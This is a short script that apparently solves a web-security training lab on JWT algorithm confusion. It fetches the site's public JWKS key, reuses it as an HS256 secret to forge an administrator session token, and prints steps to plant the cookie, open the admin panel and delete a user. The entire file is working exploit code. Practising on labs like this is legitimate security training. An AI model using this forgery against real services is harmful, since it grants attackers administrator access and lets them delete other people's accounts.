import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { JWT } from "../utils/JWT.js";
import { createPublicKey } from "node:crypto";

const { labUrl, httpClient } = getParsedInputFromUser({
  description: "Lab: JWT authentication bypass via algorithm confusion",
  allowProxy: true,
});

runTasks([task]);

async function task() {
  console.log(`
To solve the lab:
  1. Edit your browser cookie for the lab site with key "session" and value "${await createAdminJwtSignedWithPublicKey()}"
  2. Go to admin page:
  "${labUrl}admin"
  3. Delete carlos's account
`);
}

async function createAdminJwtSignedWithPublicKey() {
  const { data: jwkSet } = await httpClient.get(labUrl + "jwks.json");
  const publicKey = createPublicKey({ key: jwkSet.keys[0], format: "jwk" });
  const secret = publicKey.export({ format: "pem", type: "spki" }) as string;
  const header = { alg: "HS256" };
  const payload = { sub: "administrator" };
  return new JWT({ header, payload }).sign(secret);
}
